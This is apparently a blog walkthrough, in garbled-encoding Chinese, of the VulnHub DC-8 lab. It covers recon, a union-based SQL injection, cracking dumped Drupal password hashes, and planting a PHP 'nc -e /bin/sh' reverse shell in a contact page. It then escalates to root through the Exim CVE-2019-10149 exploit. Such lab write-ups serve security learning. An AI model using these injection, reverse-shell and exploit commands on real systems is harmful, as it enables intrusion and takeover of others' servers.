<h2 id="ä¿¡æ¯æ”¶é›†-7"><a href="#ä¿¡æ¯æ”¶é›†-7" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p> å…ˆ<code>nmap</code>æ‰«ä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20221102234939357.png" alt="image-20221102234939357"></p>
<blockquote>
<p>å‘ç°<br><code>22</code>ç«¯å£<br>è¿è¡Œç€<code>ssh</code></p>
<p>80ç«¯å£ä¸‹<br>å‘ç°æœ‰ä¸ª<code>include</code>é¡µé¢ï¼Œå¯èƒ½éœ€è¦åœ¨è¿™é‡Œä¸Šä¼ æœ¨é©¬æ‹¿shell<br>ç„¶åæœ‰<code>install.mysql.txt</code>ï¼Œçœ‹æ¥å¯èƒ½éœ€è¦ç”¨åˆ°æ•°æ®åº“</p>
</blockquote>
<p>å†<code>dirsearch</code>æ‰«ä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20221102235306844.png" alt="image-20221102235306844"></p>
<blockquote>
<p>å‘ç°æœ‰<code>/user/login</code>é¡µé¢ï¼ŒçŒœæµ‹æ˜¯ç™»å½•åå°çš„é¡µé¢<br>åé¢æ‰¾æ‰¾æœ‰æ²¡æœ‰è´¦å·å¯†ç ä¿¡æ¯</p>
</blockquote>
<p>å†çœ‹çœ‹<code>wapplzer</code></p>
<p><img src="/post/vulnhub/image-20221103112318956.png" alt="image-20221103112318956"></p>
<h2 id="1-sqlæ³¨å…¥"><a href="#1-sqlæ³¨å…¥" class="headerlink" title="1.sqlæ³¨å…¥"></a>1.sqlæ³¨å…¥</h2><p>ç„¶ååˆ†æç½‘ç«™é¡µé¢</p>
<p>å‘ç°åœ¨<code>details</code>æ—¶ï¼Œ<code>url</code>å‡ºç°</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.147</span>/?nid=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103112255720.png" alt="image-20221103112255720"></p>
<p>çœ‹åˆ°æ³¨å…¥å¤„ï¼Œå†ç»“åˆä¹‹å‰çš„<code>nmap</code>æ‰«æçš„ç»“æœï¼Œæœ‰<code>mysql</code>å®‰è£…ï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨<code>sql</code>æ³¨å…¥</p>
<p>è¯•è¯•<code>sql</code>æ³¨å…¥æœ‰æ²¡æœ‰ååº”</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.147</span>/?nid=-<span class="number">1</span> union select schema_name from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103130411912.png" alt="image-20221103130411912"></p>
<p>çœ‹æ¥ç¡®å®æ˜¯å­˜åœ¨<code>sql</code>æ³¨å…¥</p>
<p>æ‰‹åŠ¨æ³¨ä¸éš¾ï¼Œå®Œå…¨æ²¡æœ‰è¿‡æ»¤ï¼Œä½†è¿˜æ˜¯ç”¨<code>sqlmap</code>ç›´æ¥æ¢­å“ˆ</p>
<p>æ•°æ®åº“çŸ¥é“äº†</p>
<p>å…ˆçœ‹çœ‹è¡¨</p>
<p><img src="/post/vulnhub/image-20221103131256965.png" alt="image-20221103131256965"></p>
<p>çœ‹åˆ°æœ‰ä¸ª<code>users</code>åˆ—ï¼ŒæŸ¥çœ‹æœ‰æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„åå°ç™»å½•çš„è´¦å·å¯†ç </p>
<p>å‘ç°æœ‰ä¸¤ä¸ªç”¨æˆ·</p>
<p><img src="/post/vulnhub/image-20221103131824229.png" alt="image-20221103131824229"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">admin <span class="variable">$S</span><span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span></span><br><span class="line">john <span class="variable">$S</span><span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span><span class="regexp">/3if/</span>oRVZJaz5mKC2vF</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¯†ç æ˜¯åŠ å¯†çš„ï¼Œæˆ‘ä»¬ç”¨<code>john</code>çˆ†ç ´ä¸€ä¸‹</p>
<p>å…ˆæŠŠå¯†ç å†™å…¥å¯†ç æ–‡æœ¬<code>pass.txt</code></p>
<p><img src="/post/vulnhub/image-20221103133656691.png" alt="image-20221103133656691"></p>
<p><img src="/post/vulnhub/image-20221103133745514.png" alt="image-20221103133745514"></p>
<p>ç„¶åå°±ç”¨<code>john</code>è‡ªå¸¦çš„å¯†ç æœ¬å°±è¡Œ</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">john <span class="keyword">pass</span>.txt</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å†è¿™é‡Œæˆ‘ç”¨äº†<code>johny</code></p>
<p><img src="/post/vulnhub/image-20221103134419589.png" alt="image-20221103134419589"></p>
<p>ä¸€ä¸ªå›¾å½¢åŒ–çš„çˆ†ç ´å·¥å…·</p>
<p>è¿™é‡Œåªå¾—åˆ°<code>john</code>ç”¨æˆ·çš„å¯†ç </p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">turtle</span></span><br></pre></td></tr></table></figure>

<h2 id="2-åå°æ·»åŠ æœ¨é©¬"><a href="#2-åå°æ·»åŠ æœ¨é©¬" class="headerlink" title="2.åå°æ·»åŠ æœ¨é©¬"></a>2.åå°æ·»åŠ æœ¨é©¬</h2><p>æ‹¿åˆ°è´¦å·å¯†ç åï¼Œæˆ‘ä»¬åˆ°åå°ç™»å½•é¡µé¢è¿›è¡Œç™»å½•</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.147</span><span class="regexp">/user/</span>login</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103134815814.png" alt="image-20221103134815814"></p>
<p>ç™»å½•æˆåŠŸï¼Œæ ¹æ®ä¹‹å‰æˆ‘ä»¬ä¿¡æ¯æ”¶é›†ï¼Œåœ¨<code>nmap</code>å¾—åˆ°çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸Šä¼ æœ¨é©¬æˆ–è€…ä¿®æ”¹æ–‡ä»¶å†…å®¹çš„åœ°æ–¹</p>
<p>åœ¨å³ä¸Šè§’æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸ª<code>content</code></p>
<p>æ‰“å¼€çœ‹çœ‹é‡Œé¢æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹</p>
<p><img src="/post/vulnhub/image-20221103135017243.png" alt="image-20221103135017243"></p>
<p>ç»“æœå‘ç°<code>Contact Us</code>é¡µé¢æ–‡ä»¶å¯ä»¥è¿›è¡Œä¿®æ”¹</p>
<p>æ‰“å¼€çœ‹çœ‹ï¼Œå‘ç°åœ¨<code>edit</code>æ²¡æœ‰ä¿®æ”¹çš„åœ°æ–¹</p>
<p><img src="/post/vulnhub/image-20221103142531482.png" alt="image-20221103142531482"></p>
<p>äºæ˜¯æ‰¾äº†æ‰¾ç½‘ç«™æºç åœ¨</p>
<p><img src="/post/vulnhub/image-20221103143057684.png" alt="image-20221103143057684"></p>
<p>è¿™é‡Œå¯ä»¥ä¿®æ”¹ï¼Œäºæ˜¯æˆ‘ä»¬å°±ä¿®æ”¹ä¸€ä¸‹</p>
<p>å¹¶è®°å¾—æŠŠç¼–ç æ–‡ä»¶æ ¼å¼æ”¹ä¸º<code>PHP code</code></p>
<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Thanks for taking the time to contact us. We shall be in contact soon.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nc -e /bin/sh 192.168.133.140 8888&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103143148817.png" alt="image-20221103143148817"></p>
<p><img src="/post/vulnhub/image-20221103144244656.png" alt="image-20221103144244656">ç„¶ååº•ä¸‹ä¿å­˜</p>
<h2 id="3-åå¼¹shell"><a href="#3-åå¼¹shell" class="headerlink" title="3.åå¼¹shell"></a>3.åå¼¹shell</h2><p>ç„¶åæˆ‘ä»¬å¼€å§‹ç›‘å¬</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103145521745.png" alt="image-20221103145521745"></p>
<p>è®¿é—®<code>Contact Us</code>é¡µé¢å‘é€ä¿¡æ¯ï¼Œä»è€Œè§¦å‘phpæ‰§è¡Œå‘½ä»¤</p>
<p><img src="/post/vulnhub/image-20221103145747096.png" alt="image-20221103145747096"></p>
<p>æ‹¿åˆ°<code>shell</code></p>
<p><img src="/post/vulnhub/image-20221103145811789.png" alt="image-20221103145811789"></p>
<h2 id="4-ææƒã€exim4ã€‘"><a href="#4-ææƒã€exim4ã€‘" class="headerlink" title="4.ææƒã€exim4ã€‘"></a>4.ææƒã€exim4ã€‘</h2><p>å…ˆè¿›å…¥äº¤äº’å¼<code>shell</code></p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103145952120.png" alt="image-20221103145952120"></p>
<p>å…ˆæŸ¥çœ‹ä¸€ä¸‹<code>suid</code>å‘½ä»¤</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103150054750.png" alt="image-20221103150054750"></p>
<p>æ‰¾åˆ°äº†ä¸ªæ–°çš„å‘½ä»¤<code>exim4</code>ï¼Œæœäº†ä¸€ä¸‹</p>
<blockquote>
<p><code>exim4</code></p>
<p><code>exim</code>è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ†æï¼ˆ<code>cve-2019-10149</code>ï¼‰</p>
<p>åœ¨å¯¹Eximé‚®ä»¶æœåŠ¡å™¨æœ€æ–°æ”¹åŠ¨è¿›è¡Œä»£ç å®¡è®¡è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°4.87åˆ°4.91ç‰ˆæœ¬ä¹‹é—´çš„Eximå­˜åœ¨ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚è¿™é‡ŒRCEæŒ‡çš„æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRemote Command Executionï¼‰ï¼Œè€Œä¸æ˜¯è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRemote Code Executionï¼‰ï¼š<code>æ”»å‡»è€…å¯ä»¥ä»¥rootæƒé™ä½¿ç”¨execv()æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œåˆ©ç”¨è¿‡ç¨‹ä¸­ä¸æ¶‰åŠåˆ°å†…å­˜ç ´åæˆ–è€…ROPï¼ˆReturn-Oriented Programmingï¼‰ç›¸å…³å†…å®¹ã€‚</code></p>
<p>è¿™ä¸ªæ¼æ´å¯ä»¥ç”±æœ¬åœ°æ”»å‡»è€…ç›´æ¥åˆ©ç”¨ï¼ˆè¿œç¨‹æ”»å‡»è€…éœ€è¦åœ¨ç‰¹å®šçš„éé»˜è®¤é…ç½®ä¸‹åˆ©ç”¨ï¼‰ã€‚ä¸ºäº†åœ¨é»˜è®¤é…ç½®ä¸‹è¿œç¨‹åˆ©ç”¨è¯¥æ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦ä¸å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨å»ºè¿7å¤©ï¼ˆå¯ä»¥æ¯éš”å‡ åˆ†é’Ÿå‘é€1ä¸ªå­—èŠ‚ï¼‰ã€‚ç„¶è€Œç”±äºEximçš„ä»£ç éå¸¸å¤æ‚ï¼Œæˆ‘ä»¬æ— æ³•ä¿è¯è¿™é‡Œä»‹ç»çš„æ–¹æ³•æ˜¯å”¯ä¸€çš„åˆ©ç”¨æ–¹æ³•ï¼Œå¯èƒ½è¿˜å­˜åœ¨å…¶ä»–æ›´åŠ å¿«æ·çš„æ–¹æ³•ã€‚</p>
<p>ä»4.87ç‰ˆå¼€å§‹ï¼ˆ2016å¹´4æœˆ6æ—¥å…¬å¸ƒï¼‰ï¼Œç”±äº#ifdef EXPERIMENTAL_EVENTæ”¹æˆäº†#ifndef DISABLE_EVENTï¼Œå› æ­¤Eximé»˜è®¤æƒ…å†µä¸‹å°±å­˜åœ¨æ¼æ´ã€‚åœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå¦‚æœæ‰‹åŠ¨å¯ç”¨äº†EXPERIMENTAL_EVENTé€‰é¡¹ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¹Ÿä¼šå­˜åœ¨æ¼æ´ã€‚ä»¤äººæƒŠè®¶çš„æ˜¯ï¼Œè¿™ä¸ªæ¼æ´å·²ç»åœ¨4.92ç‰ˆä¸­è¢«ä¿®å¤ï¼ˆ2019å¹´2æœˆ10æ—¥ï¼‰ï¼š</p>
</blockquote>
<p>æ ¹æ®æ–‡æ¡£ï¼Œå‘ç°æ˜¯ä¸ªå’Œé‚®ä»¶æœåŠ¡æœ‰å…³çš„å‘½ä»¤ï¼Œå¹¶ä¸”å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p>
<p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨è¿™ä¸ª<code>nday</code>çš„èŒƒå›´é‡Œ</p>
<p><img src="/post/vulnhub/image-20221103150517673.png" alt="image-20221103150517673"></p>
<p>å‘ç°åˆšå¥½æ˜¯è¿™ä¸ªç‰ˆæœ¬èŒƒå›´ï¼Œæ˜¯å­˜åœ¨<code>RCE</code></p>
<p>æŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰åˆ©ç”¨çš„è„šæœ¬</p>
<p><img src="/post/vulnhub/image-20221103151738985.png" alt="image-20221103151738985"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Privilegeï¼šç‰¹æƒ</span><br></pre></td></tr></table></figure>

<p>é€‰æ‹©<code>46996.sh</code>ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è„šæœ¬æ–‡ä»¶å†…å®¹</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">searchsploit <span class="number">46996</span> -p  </span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/linux/</span>local/<span class="number">46996</span>.sh</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103151838092.png" alt="image-20221103151838092"></p>
<p><img src="/post/vulnhub/image-20221103152003846.png" alt="image-20221103152003846"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªä½¿ç”¨æ–¹æ³•ï¼Œä¸€ä¸ª<code>setuid</code>ï¼Œä¸€ä¸ª<code>netcat</code></p>
<p>ä¸»è¦æ˜¯ä¸Šä¼ åˆ°é¶æœº<code>shell</code>åï¼Œæ‰§è¡Œå‘½ä»¤ä¸åŒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br><span class="line">æˆ–</span><br><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>





<p>æˆ‘ä»¬å…ˆæŠŠè„šæœ¬æ–‡ä»¶å¤åˆ¶ä¸‹æ¥</p>
<p><img src="/post/vulnhub/image-20221103152351530.png" alt="image-20221103152351530"></p>
<p>å†ä¸Šä¼ åˆ°é¶æœº<code>shell</code></p>
<p><code>kali</code>ä¸»æœºæ‰§è¡Œ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">9999</span> &lt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103152714451.png" alt="image-20221103152714451"></p>
<p>é¶æœº<code>shell</code>ä¸­æ‰§è¡Œ</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> <span class="number">192.168.133.140</span> <span class="number">9999</span> &gt; raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103153550325.png" alt="image-20221103153550325"></p>
<p>å‘ç°æƒé™ä¸å¤Ÿï¼Œçœ‹æ¥æ˜¯ä¸èƒ½åœ¨è¿™ä¸ªé¡µé¢æ–°å»ºæ–‡ä»¶</p>
<p>æˆ‘ä»¬åˆ°<code>/tmp</code>ç›®å½•ä¸‹ä¸€èˆ¬å¯ä»¥</p>
<p><img src="/post/vulnhub/image-20221103153658085.png" alt="image-20221103153658085"></p>
<p>ä¸‹è½½æˆåŠŸ</p>
<p>æ‰§è¡Œææƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103153740349.png" alt="image-20221103153740349"></p>
<p>å‘ç°æ— æ‰§è¡Œæƒé™ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">chmod</span> <span class="number">777</span> raptor_exim_wiz</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103153901179.png" alt="image-20221103153901179"></p>
<p>æˆåŠŸæ‰§è¡Œè„šæœ¬</p>
<hr>
<h3 id="æ„å¤–"><a href="#æ„å¤–" class="headerlink" title="æ„å¤–"></a>æ„å¤–</h3><p>ä½†ç»“æœå‘ç°è¿˜æ˜¯</p>
<p><img src="/post/vulnhub/image-20221103154130346.png" alt="image-20221103154130346"></p>
<p>ä½æƒé™è´¦å·</p>
<p>äºæ˜¯æˆ‘ä»¬å†æ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m netcat</span><br></pre></td></tr></table></figure>

<p>ç»“æœè¿˜æ˜¯ä¸€æ ·</p>
<p><img src="/post/vulnhub/image-20221103155324498.png" alt="image-20221103155324498"></p>
<p>è€Œä¸”æé†’åœ¨é¶æœºçš„<code>31337</code>ç«¯å£è¿æ¥å…³é—­äº†</p>
<p>çœ‹äº†çœ‹å…¶ä»–å¤§ä½¬çš„<code>wp</code></p>
<p>å‘ç°æœ‰ä¸€æ­¥ã€å…¶å®æ˜¯æ²¡å¿…è¦çš„ã€‘</p>
<blockquote>
<p>åœ¨è„šæœ¬æ–‡ä»¶é‡Œæ‰§è¡Œ<br>è¯´æ˜¯å› ä¸ºè¿™ä¸ªè„šæœ¬æ˜¯<code>windows</code>åº•ä¸‹ç¼–å†™çš„ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸€ä¸‹ï¼Œæ”¹æˆ<code>Linux</code><br><code>set ff=unix</code></p>
</blockquote>
<p>ç»“æœè¿˜æ˜¯ä¸€æ ·ï¼Œçœ‹æ¥æ˜¯é¶æœºæœ‰é—®é¢˜äº†ï¼ŒçŒœæµ‹æ˜¯é¶æœºå’Œ<code>kali</code>ä¸»æœºä¹‹é—´è¿æ¥æœ‰é—®é¢˜ï¼Œæˆ‘æ¢æ‰‹æœºçƒ­ç‚¹è¯•è¯•</p>
<hr>
<p>æˆåŠŸã€æ ¡å›­ç½‘çœŸåƒåœ¾ã€‘</p>
<p><img src="/post/vulnhub/image-20221103160625006.png" alt="image-20221103160625006"></p>
<p>åˆ°æ ¹ç›®å½•æŸ¥çœ‹<code>flag</code></p>
<p><img src="/post/vulnhub/image-20221103160824407.png" alt="image-20221103160824407"></p>
<p>å¾—åˆ°<code>flag</code></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;</span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888</span><br></pre></td></tr></table></figure>

<p><code>Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m also sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>This challenge was largely based on two things:</code></p>
<ol>
<li><code>A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</code></li>
<li><code>A suggestion from @theart42</code></li>
</ol>
<p><code>The answer to that question is...</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>å¸Œæœ›ä½ å–œæ¬¢ DC-8ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>æä¾›åé¦ˆçš„äººï¼Œä»¥åŠæ‰€æœ‰èŠ±æ—¶é—´å®Œæˆè¿™äº›å°äº‹çš„äºº<br>æŒ‘æˆ˜ã€‚</p>
<p>æˆ‘è¿˜è¦ç‰¹åˆ«æ„Ÿè°¢ï¼š</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@å¿ƒ42</p>
<p>è¿™ä¸€æŒ‘æˆ˜ä¸»è¦åŸºäºä¸¤ä»¶äº‹ï¼š</p>
<ol>
<li>æˆ‘ä»æœ‰äººè¯¢é—®å…³äº Linux æœºå™¨ä¸Šçš„ 2FA ä»¥åŠå®ƒæ˜¯å¦å€¼å¾—çš„ä¸€æ¡æ¨æ–‡ã€‚</li>
<li>æ¥è‡ª@theart42 çš„å»ºè®®</li>
</ol>
<p>è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ˜¯â€¦â€¦</p>
<p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</p>
</blockquote>
<p>ã€æ³¨æ„ï¼Œè¿™ä¸ªææƒä¸ç¨³å®šï¼Œæ‰€ä»¥éœ€è¦å¿«ç‚¹æ‹¿å–<code>flag</code>ï¼Œæˆ–è€…æŒ‰æˆ‘ä¹‹å‰å†™çš„æ–¹æ³•è¿›å…¥ç¨³å®š<code>shell</code>ã€‘</p>
<hr>
<h3 id="p-s-setuid"><a href="#p-s-setuid" class="headerlink" title="p.s. setuid"></a>p.s. setuid</h3><p>æˆ‘å†è¯•è¯•å¦å¤–ä¸€ä¸ªå‘½ä»¤è¯•è¯•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103161221325.png" alt="image-20221103161221325"></p>
<p>å‘ç°è¿˜æ˜¯ä¸€æ ·</p>
<p>æŸ¥äº†ä¸€ä¸‹</p>
<blockquote>
<p><code>setuid</code></p>
<p><code>setuid</code>æ˜¯ç±»unixç³»ç»Ÿæä¾›çš„ä¸€ä¸ªæ ‡å¿—ä½ï¼Œ å…¶å®é™…æ„ä¹‰æ˜¯setä¸€ä¸ªprocessçš„euidä¸ºè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æˆ–ç¨‹åºçš„æ‹¥æœ‰è€…(æ¯”å¦‚root)çš„uidï¼Œ ä¹Ÿå°±æ˜¯è¯´å½“setuidä½è¢«è®¾ç½®ä¹‹åï¼Œ å½“æ–‡ä»¶æˆ–ç¨‹åº(ç»Ÿç§°ä¸ºexecutable)è¢«æ‰§è¡Œæ—¶, æ“ä½œç³»ç»Ÿä¼šèµ‹äºˆæ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™, å› ä¸ºå…¶euidæ˜¯æ–‡ä»¶æ‰€æœ‰è€…çš„uid.</p>
</blockquote>
<p>è€Œä¸”æˆ‘ä»¬æ‰§è¡Œå®Œå‘ç°ç”Ÿæˆäº†ä¸¤ä¸ª<code>pwn</code>æ–‡ä»¶ã€ç‹‚å–œï¼Œæœ€è¿‘æ­£å¥½åœ¨å­¦ä¹ <code>pwn</code>ã€‘</p>
<p>æŸ¥äº†ä¸€ä¸‹<code>setuid</code>åœ¨<code>pwn</code>ä¸­çš„åˆ©ç”¨</p>
<h4 id="åœ¨pwnä¸­"><a href="#åœ¨pwnä¸­" class="headerlink" title="åœ¨pwnä¸­"></a>åœ¨pwnä¸­</h4><p><code>ä»€ä¹ˆæ˜¯setuidï¼Ÿ</code></p>
<blockquote>
<p><code>setuid</code>ä»£è¡¨è®¾ç½®ç”¨æˆ·èº«ä»½ï¼Œå¹¶ä¸”<code>setuid</code>è®¾ç½®è°ƒç”¨è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ·IDï¼Œç”¨æˆ·è¿è¡Œç¨‹åºçš„uidä¸è°ƒç”¨è¿›ç¨‹çš„çœŸå®uidä¸åŒ¹é…</p>
</blockquote>
<p>è¿™ä¹ˆè¯´èµ·æ¥æœ‰ç‚¹ç»•ï¼Œæˆ‘ä»¬æ¥ä¸¾ä¸€ä¸ªä¾‹å­</p>
<blockquote>
<p>ä¸€ä¸ªè¦ä»¥rootæƒé™è¿è¡Œçš„ç¨‹åºï¼Œä½†æˆ‘ä»¬æƒ³è®©æ™®é€šç”¨æˆ·ä¹Ÿèƒ½è¿è¡Œå®ƒï¼Œä½†åˆè¦é˜²æ­¢è¯¥ç¨‹åºè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œè¿™é‡Œå°±éœ€è¦ç”¨çš„setuidäº†</p>
</blockquote>
<p>æ¼”ç¤º<br>æˆ‘ä»¬ç”¨<code>user</code>ç”¨æˆ·è¿è¡Œä¸€ä¸ª<code>vim</code><br>ç„¶åæ–°å¼€ä¸€ä¸ªçª—å£æŸ¥çœ‹åå°è¿›ç¨‹</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">ps -<span class="built_in">aux</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221103162544585.png" alt="image-20221103162544585"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„<code>vim</code>æ­£åœ¨ä»¥<code>user</code>çš„æƒé™è¿è¡Œä¸­ï¼Œç„¶åæˆ‘ä»¬å»æ‰§è¡Œä¸€ä¸‹<code>setuid</code>æ–‡ä»¶çœ‹çœ‹</p>
<p><img src="/post/vulnhub/image-20221103162848360.png" alt="image-20221103162848360"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è™½ç„¶æ˜¯<code>user</code>ç”¨æˆ·ï¼Œä½†æ‰§è¡Œæ–‡ä»¶åï¼Œæ–‡ä»¶æ­£ä»¥<code>root</code>æƒé™è¿è¡Œ<br>æˆ‘ä»¬æŸ¥çœ‹æ–‡ä»¶çš„æƒé™</p>
<p><img src="/post/vulnhub/image-20221103162937431.png" alt="image-20221103162937431"></p>
<blockquote>
<p><code>r</code>ä»£è¡¨è¯»ï¼Œ<code>w</code>ä»£è¡¨å†™ï¼Œ<code>x</code>ä»£è¡¨æ‰§è¡Œï¼Œé‚£<code>s</code>æ˜¯ä»€ä¹ˆå‘¢</p>
</blockquote>
